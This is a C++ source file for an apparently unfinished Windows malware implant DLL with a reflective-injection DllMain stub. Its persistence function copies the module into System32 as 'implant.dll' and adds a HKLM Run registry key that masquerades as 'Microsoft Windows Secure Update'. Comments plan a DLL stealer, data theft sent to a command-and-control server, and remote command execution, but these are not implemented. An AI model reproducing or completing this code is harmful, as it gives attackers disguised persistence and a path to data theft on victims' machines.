#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <winreg.h>
#include <WinBase.h>
#include <lmcons.h>
#include <securitybaseapi.h>
#include <info.h>


//For Persistence--------------------------------------------------------
/* *Credit*
https://github.com/CoolerVoid/X_files/blob/master/src/automatically_run_proc_startup.cpp 
*/
#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <stdio.h>
#include <memory>

// run at 32bit and 64bit
#define KEY_WOW64_32KEY 0x0200
#define KEY_WOW64_64KEY 0x0100
#if defined(_WIN64)
 #define CROSS_ACCESS KEY_WOW64_32KEY
#else
 #define CROSS_ACCESS KEY_WOW64_64KEY
#endif
//For Persistence---------------------------------------------------------------



//DLL stealer

//gather info (Situational Awareness) 
	//How to send Data to C2?


//Add code for persistence!
int persistentdll(){
	// copy program implant.dll to system32 directory
    wchar_t system2[MAX_PATH];
    wchar_t pathtofile[MAX_PATH];
    HMODULE ModPath = GetModuleHandle(NULL);
    GetModuleFileName(ModPath,pathtofile,sizeof(pathtofile));
    GetSystemDirectory(system2,sizeof(system2));
    wcscat(system2,L"\\implant.dll"); // program name at second argv
    CopyFile(pathtofile,system2,false);

    // write registry entries
    HKEY hKey;
    RegOpenKeyEx(HKEY_LOCAL_MACHINE,L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE | CROSS_ACCESS,&hKey );
    // https://msdn.microsoft.com/en-us/library/windows/desktop/ms724923%28v=vs.85%29.aspx
    RegSetValueEx(hKey, L"Microsoft Windows Secure Update",0,REG_SZ,(const unsigned char*)system2,sizeof(system2));
    RegCloseKey(hKey);

	return EXIT_SUCCESS;
}

//Ability to follow commmands from C2

//Characteristics pre configured??


//Check for chonky.txt file???



//EXPORT REFLECTIVE LOADER FUNCTION
//possibly import library that loads for me?


//my DLL Main (Needs to be exported)
bool myDLLmain(){
	persistentdll();


	return true; 
}


// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
extern HINSTANCE hAppInstance;

HMODULE DllHandle = NULL; 

//DLL MAIN
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {

    switch( fdwReason ) 
    { 
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
			MessageBoxA( NULL, "Hello from DllMain!", "Reflective Dll Injection", MB_OK );
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }




    return TRUE;
}